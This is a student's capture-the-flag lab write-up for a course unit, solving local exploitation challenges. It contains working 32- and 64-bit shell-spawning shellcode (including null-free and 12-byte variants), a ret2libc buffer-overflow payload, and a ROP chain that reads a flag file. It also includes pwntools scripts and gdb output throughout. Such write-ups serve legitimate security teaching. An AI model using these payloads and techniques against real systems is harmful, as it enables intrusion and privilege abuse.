# Write-up for Unit2-1

- netID: TXK220008
- Name: Takemaru Kadoi

All the write-ups are supposed to use this import.

```python
from pwn import *
```

## 1-shellcode-32

The problem statement is below.

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.
```

The solution seems straightforward. Write assembly to execute the command above.

[This site](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) looks good to refer to system calls.

This is the assembly code to execute the required shellcode.

```python
# setregid(getegid(), getegid())
# getegid: 0x32(%eax)
# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)
shellcode = asm(
    """
mov     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
mov     eax, 0x47
int     0x80
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
mov     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
mov     ecx, 0
mov     edx, 0
int     0x80
"""
)
```

This is the code to run the assembly.

```python
io = process(['./1-shellcode-32'])
io.interactive()
```

After running the program, you get the following flag.

```bash
TXK220008@ctf-vm1:~/unit2/1-shellcode-32$ ./solve.py
[+] Starting local process './1-shellcode-32': pid 17060
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{execve_bin_sh}
```

## 2-shellcode-64

The problem statement is below.

```md
Write a 64-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.
```

The only difference from `1-shellcode-32` is that this problem uses 64-bit program. Bear it in mind and solve it.

To make the assembly for 64-bit program, use `context.clear(arch="amd64")`.

The program is basically the same, but to use 8 bytes for a string, I am using stack here.

```x86asm
mov     rbx, 0x68732f6e69622f2f
push    0
push    rbx
mov     rdi, rsp
```

```python
context.clear(arch="amd64")

# setregid(getegid(), getegid())
# getegid: 0x6c(%rax)
# setregid: 0x72(%rax) (%rdi = gid_t rgid, %rsi = gid_t rgid)
shellcode = asm(
    """
mov     rax, 0x6c
syscall
mov     rdi, rax
mov     rsi, rax
mov     rax, 0x72
syscall
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x3b(%rax) (%rdi = const char *filename, %rsi = const char *const *argv, %rdx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
mov     rax, 0x3b
mov     rbx, 0x68732f6e69622f2f
push    0
push    rbx
mov     rdi, rsp
mov     rsi, 0
mov     rdx, 0
syscall
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./2-shellcode-64"])
io.interactive()
```

After running the program, you get the following flag.

```bash
TXK220008@ctf-vm1:~/unit2/2-shellcode-64$ ./solve2.py
[+] Starting local process './2-shellcode-64': pid 9898
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{exEcvE_b1n_5h
```

## 3-nonzero-shellcode-32

The problem statement is below

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.

Your shellcode must not have zero byte.
Check that with make objdump and make print. No 00 or \x00!
```

The problem here is how to write `mov <register> <immediate_value>`

For example, the `mov eax, 0x32` contains `0x00`, i.e., a zero byte.

```bash
>>> asm("mov eax, 0x32")
b'\xb82\x00\x00\x00'
```

We can do it using `xor` and `add`. In the above case, we can write like this.

```bash
>>> asm("xor eax, eax")
b'1\xc0'
>>> asm("add eax, 0x32")
b'\x83\xc02
```

Thus, the overview of the code is like this.

```python
# setregid(getegid(), getegid())
# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)
# getegid: 0x32(%eax)
shellcode = asm(
    """
xor     eax, eax
add     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
xor     eax, eax
add     eax, 0x47
int     0x80
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
xor     eax, eax
add     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
xor     ecx, ecx
xor     edx, edx
int     0x80
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./3-nonzero-shellcode-32"])
io.interactive()
```

You get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/3-nonzero-shellcode-32$ ./solve3.py 
b'1\xc0\x83\xc02\xcd\x80\x89\xc3\x89\xc11\xc0\x83\xc0G\xcd\x801\xc0\x83\xc0\x0bRhn/shh//bi\x89\xe31\xc91\xd2\xcd\x80'
[+] Starting local process './3-nonzero-shellcode-32': pid 12180
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{push_aNd_X0R}
```

## 4-nonzero-shellcode-64

The problem statement is below.(fixed typo)

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.

Your shellcode must not have zero byte.
Check that with make objdump and make print. No 00 or \x00!
```

Basically, the same as 32-bit version.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, gdb, process

context.clear(arch="amd64")
context.terminal = ["tmux", "splitw", "-h"]

# setregid(getegid(), getegid())
# getegid: 0x6c(%rax)
# setregid: 0x72(%rax) (%rdi = gid_t rgid, %rsi = gid_t rgid)
shellcode = asm(
    """
xor     rax, rax
add     rax, 108
syscall
mov     rdi, rax
mov     rsi, rax
xor     rax, rax
add     rax, 114
syscall
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x3b(%rax) (%rdi = const char *filename, %rsi = const char *const *argv, %rdx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
xor     rax, rax
add     rax, 0x3b
xor     rdx, rdx
push    rdx
mov     rbx, 0x68732f6e69622f2f
push    rbx
mov     rdi, rsp
xor     rsi, rsi
xor     rdx, rdx
syscall
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./4-nonzero-shellcode-64"])
# p = gdb.attach(
#     io,
#     """
# break *0x400aeb
# run
# """,
# )
io.interactive()
```

Executing this, you get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/4-nonzero-shellcode-64$ ./solve4.py
[+] Starting local process './4-nonzero-shellcode-64': pid 11626
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{n0_puSh_bUt_CLTD}
```

## 5-short-shellcode-64

The problem statement is below.

```md
Can you write a non-zero shellcode without using more than 12 bytes, in amd64?
The program runs setregid(getegid(), getegid()) for you.
```

When I run this Python program, it says that the shellcode is too long.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, process

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"

io = process(["./5-short-shellcode-64"])
shellcode = asm(
    """
mov     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
mov     ecx, 0
mov     edx, 0
int     0x80
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io.interactive()
```

We have to shorten x86 code to execute the below.

```bash
  execve("/bin/sh", 0, 0);
```

It uses a lot of bytes to use "/bin/sh" naively.

The first thing I can improve is `mov eax, 0x0b`. Why does it use `eax` instead of `al` to decrease the bytes.

Second, pushing an entire string is costly. Create a link to `/bin/sh` like `ln -s /bin/sh A` and change the program to `execve("A", 0, 0);"`. Moreover, `mov` instruction is costly. Use `push` the top of the stack and `pop` it to`rsp`.

Also, `mov {register} {constant}` is byte-consuming. Apply `xor` to `rsi`. For `rdx`, you can use `cltd`. This instruction fills `cltd` with the most bit of `rax`.

The remaining thing is to execute `syscall`. This is it.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, process

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"


shellcode = asm(
    """
cltd
mov     al, 0x3b
push    0x41
push    rsp
pop     rdi
xor     rsi, rsi
syscall
"""
)

print(shellcode, len(shellcode))
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./5-short-shellcode-64"])
io.interactive()

```

Then, you get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/5-short-shellcode-64$ ./solve5.py 
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.8/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
    cltd
    mov al, 0x3b
    push 0x41
    push rsp
    pop rdi
    xor rsi, rsi
    syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-f74zykiu/step2 /tmp/pwn-asm-f74zykiu/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-f74zykiu/step3 /tmp/pwn-asm-f74zykiu/step4
b'\x99\xb0;jAT_H1\xf6\x0f\x05' 12
[+] Starting local process './5-short-shellcode-64': pid 29486
[*] Switching to interactive mode
[DEBUG] Received 0x25 bytes:
    b'Reading shellcode from shellcode.bin\n'
Reading shellcode from shellcode.bin
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2b bytes:
    b'CS6332{y0u_mAy_ne3d_n0t_m0rE_tHaN_3_bytEs}\n'
CS6332{y0u_mAy_ne3d_n0t_m0rE_tHaN_3_bytEs}
```


## 7-dep-0

The problem statement is below.

```md
NO system() but you will call system() on this system...
```

Use gdb to analyze the binary.

In the `input_func`, there is a syscall of `read`.

```x86asm
 8048548:	e8 43 fe ff ff       	call   8048390 <read@plt>
```

We can see it as below in gdb, so `0xffffd190` may be used as buffer overflow.

```gdb
 ► 0x8048548 <input_func+37>    calll  read@plt <read@plt>
        fd: 0x0
        buf: 0xffffd190 —▸ 0xf7fe2a70 (_dl_lookup_symbol_x+16) ◂— addl   $0x1a590, %edi
        nbytes: 0x100
```

Use `info frame` to check saved registers.

```gdb
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> info frame
Stack level 0, frame at 0xffffd220:
 eip = 0x804855c in input_func; saved eip = 0x8048579
 called by frame at 0xffffd250
 Arglist at 0xffffd218, args: 
 Locals at 0xffffd218, Previous frame's sp is 0xffffd220
 Saved registers:
  ebx at 0xffffd214, ebp at 0xffffd218, eip at 0xffffd21c
```

`eip` should be return address. How many bytes do we need to pad to use it?

`0xffffd21c`(`eip`) - `0xffffd190`(`buf`) = 140(bytes)

We know 140 bytes are needed to make its buffer overflow.

```gdb
pwndbg> 
Please type your name: 
00000000111111112222222233333333444444445555555566666666777777778888888899999999000000001111111122222222333333334444444455555555666666667777111
```

After the buffer overflow, we successfully make the code to call system and exit.

```gdb
pwndbg> p system
$1 = {<text variable, no debug info>} 0xf7e3adb0 <__libc_system>
```

Using the `system` address, next we get `/bin/sh` address.

```gdb
pwndbg> find 0xf7e3adb0, +99999999,"/bin/sh"
0xf7f5bb2b
warning: Unable to access 16000 bytes of target memory at 0xf7fb58b3, halting search.
1 pattern found.
```

We got the shell address.

In summary, we have system call address, `0xf7e3adb0` and shell address, `0xf7f5bb2b`.

Use them to get the address.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import context, gdb, p32, process

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "DEBUG"

io = process(["./7-dep-0"])
io.recv()
payload = b"a" * 140 + p32(0xF7E3ADB0) + b"ABCD" + p32(0xF7F5BB2B)
io.sendline(payload)
io.interactive()
```

After the execution, we get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/7-dep-0$ ./solve7.py 
[+] Starting local process './7-dep-0': pid 20760
[*] Switching to interactive mode
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0\xad\xe3\xf7ABCD+\xbb\xf5\xf7
\xd2\xff\xff\x10\xed\xf7&N!
$ cat flag
CS6332{l1bc_sy5t3M}
```

## 8-dep-1

The problem statement is below.

```md
Can you run the following functions by exploiting
a buffer overflow vulnerability?

1. fd = open("flag", O_RDONLY);
2. read(fd, buf, 0x100);
3. write(1, buf, 0x100);

Then, the flag is yours!
```

Run it with `gdb`. From what we can observe in the data flow, we call `main`, `non_main_func`, and `input_func` sequentially.

After its overview, look into more details.

The `input_func` program calls `read` and `printf` like below. The buffer address, `0xffffd180`, looks useful to get the flag.

```gdb
► 0x80488d7 <input_func+41>    calll  read <read>
        fd: 0x0
        buf: 0xffffd180 ◂— 0x100
        nbytes: 0x100
► 0x80488e4 <input_func+54>    calll  printf <printf>
        format: 0x80bb287 ◂— 'Hello %s!\n'
        vararg: 0xffffd180 ◂— 0x10a
```

Take a look at addresses on the stack. `eip` is the next return address.

```gdb
pwndbg> info frame
Stack level 0, frame at 0xffffd210:
 eip = 0x80488cc in input_func; saved eip = 0x8048908
 called by frame at 0xffffd240
 Arglist at 0xffffd208, args: 
 Locals at 0xffffd208, Previous frame's sp is 0xffffd210
 Saved registers:
  ebx at 0xffffd204, ebp at 0xffffd208, eip at 0xffffd20c
```

`0xffffd20c`(`eip`) - `0xffffd180` = 140(bytes), so we need 140 bytes to pad the gap.

After `input_func`, let's look at the return address of `non_main_func`.

```gdb
pwndbg> info frame
Stack level 0, frame at 0xffffd240:
 eip = 0x8048908 in non_main_func; saved eip = 0x8048923
 called by frame at 0xffffd260
 Arglist at 0xffffd238, args: 
 Locals at 0xffffd238, Previous frame's sp is 0xffffd240
 Saved registers:
  ebp at 0xffffd238, eip at 0xffffd23c
```

The next `eip` is `0xffffd23c`, and the next `eip` is `0xffffd25c`. Thus, their bytes gaps from their previous `eip`s are like these.

`0xffffd23c`(2nd `eip`) - `0xffffd20c`(1st `eip`) - `0x00000004`(overwritten return address) = 44(bytes)

`0xffffd25c`(3rd `eip`) - `0xffffd23c`(2nd `eip`) - `0x00000004` = 28(byte)

By the way, we can find a function that calls `<__libc_open>` in `some_function` function.

```assembly
08048894 <some_function>:
 8048894:	55                   	push   %ebp
 8048895:	89 e5                	mov    %esp,%ebp
 8048897:	83 ec 08             	sub    $0x8,%esp
 804889a:	83 ec 08             	sub    $0x8,%esp
 804889d:	6a 00                	push   $0x0
 804889f:	68 68 b2 0b 08       	push   $0x80bb268
 80488a4:	e8 27 4a 02 00       	call   806d2d0 <__libc_open>
 80488a9:	83 c4 10             	add    $0x10,%esp
 80488ac:	c9                   	leave  
 80488ad:	c3                   	ret    
```

In `some_function`, `0x08048894`, there is a call of `<__libc_open>`, which takes `0x0` and `0x80bb268` as its arguments. What is `0x80bb268`? gdb tells us that it's `a.txt`. Symlinking `a.txt` to `flag` helps us to open the flag.

```gdb
pwndbg> x/s 0x80bb268
0x80bb268:      "a.txt"
```

Moreover, we have the addresses to read and write in `input_func`.

- `__libc_read` = `0x806d340`
- `__libc_write` = `0x806d3b0`

```assembly
080488ae <input_func>:
 80488ae:	55                   	push   %ebp
 80488af:	89 e5                	mov    %esp,%ebp
 80488b1:	53                   	push   %ebx
 80488b2:	8d 9d 78 ff ff ff    	lea    -0x88(%ebp),%ebx
 80488b8:	81 ec 88 00 00 00    	sub    $0x88,%esp
 80488be:	6a 18                	push   $0x18
 80488c0:	68 6e b2 0b 08       	push   $0x80bb26e
 80488c5:	6a 01                	push   $0x1
 80488c7:	e8 e4 4a 02 00       	call   806d3b0 <__libc_write>
 80488cc:	83 c4 0c             	add    $0xc,%esp
 80488cf:	68 00 01 00 00       	push   $0x100
 80488d4:	53                   	push   %ebx
 80488d5:	6a 00                	push   $0x0
 80488d7:	e8 64 4a 02 00       	call   806d340 <__libc_read>
 80488dc:	58                   	pop    %eax
 80488dd:	5a                   	pop    %edx
 80488de:	53                   	push   %ebx
 80488df:	68 87 b2 0b 08       	push   $0x80bb287
 80488e4:	e8 f7 64 00 00       	call   804ede0 <_IO_printf>
 80488e9:	31 c0                	xor    %eax,%eax
 80488eb:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 80488ee:	c9                   	leave  
 80488ef:	c3                   	ret    
```

The remaining question is how to call them.

Use return-oriented-programming, with which we chain functions calls. However, there is a problem about functions' arguments. We need to pop previous functions' arguments.

In `gdb-peda`, there is a built-in function to search for popping.

```gdb
pwndbg> rop --grep 'pop' -- --nojop
```

We get `pop3_ret` for it. Insert this function after calling `__libc_read`, you can call `__libc_write` as expected.

Then, we get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/8-dep-1$ ./solve8.py 
[+] Starting local process './8-dep-1': pid 11161
[DEBUG] Received 0x18 bytes:
    b'Please type your name: \n'
[DEBUG] Sent 0xbd bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000080  00 00 00 00  00 00 00 00  00 00 00 00  94 88 04 08  │····│····│····│····│
    00000090  40 d3 06 08  0b 2e 06 08  03 00 00 00  60 d2 ff ff  │@···│·.··│····│`···│
    000000a0  00 01 00 00  b0 d3 06 08  0b 2e 06 08  01 00 00 00  │····│····│·.··│····│
    000000b0  60 d2 ff ff  00 01 00 00  cc 5b 09 08  0a           │`···│····│·[··│·│
    000000bd
[*] Switching to interactive mode
[*] Process './8-dep-1' stopped with exit code 10 (pid 11161)
[DEBUG] Received 0x108 bytes:
    00000000  48 65 6c 6c  6f 20 21 0a  43 53 36 33  33 32 7b 30  │Hell│o !·│CS63│32{0│
    00000010  70 6e 5f 72  33 41 64 5f  77 31 72 74  45 7d 0a ff  │pn_r│3Ad_│w1rt│E}··│
    00000020  f7 db ff ff  06 dc ff ff  0e dc ff ff  23 dc ff ff  │····│····│····│#···│
    00000030  ab dc ff ff  de dc ff ff  fc dc ff ff  13 dd ff ff  │····│····│····│····│
    00000040  25 dd ff ff  66 dd ff ff  9c dd ff ff  c8 dd ff ff  │%···│f···│····│····│
    00000050  16 de ff ff  36 de ff ff  a1 de ff ff  0a df ff ff  │····│6···│····│····│
    00000060  81 df ff ff  aa df ff ff  cc df ff ff  e0 df ff ff  │····│····│····│····│
    00000070  00 00 00 00  20 00 00 00  d0 cf ff f7  21 00 00 00  │····│ ···│····│!···│
    00000080  00 c0 ff f7  10 00 00 00  ff fb 8b 07  06 00 00 00  │····│····│····│····│
    00000090  00 10 00 00  11 00 00 00  64 00 00 00  03 00 00 00  │····│····│d···│····│
    000000a0  34 80 04 08  04 00 00 00  20 00 00 00  05 00 00 00  │4···│····│ ···│····│
    000000b0  06 00 00 00  07 00 00 00  00 00 00 00  08 00 00 00  │····│····│····│····│
    000000c0  00 00 00 00  09 00 00 00  36 87 04 08  0b 00 00 00  │····│····│6···│····│
    000000d0  22 27 00 00  0c 00 00 00  22 27 00 00  0d 00 00 00  │"'··│····│"'··│····│
    000000e0  23 27 00 00  0e 00 00 00  27 4e 00 00  17 00 00 00  │#'··│····│'N··│····│
    000000f0  01 00 00 00  19 00 00 00  7b d3 ff ff  1a 00 00 00  │····│····│{···│····│
    00000100  00 00 00 00  1f 00 00 00                            │····│····│
    00000108
Hello !
CS6332{0pn_r3Ad_w1rtE}
```
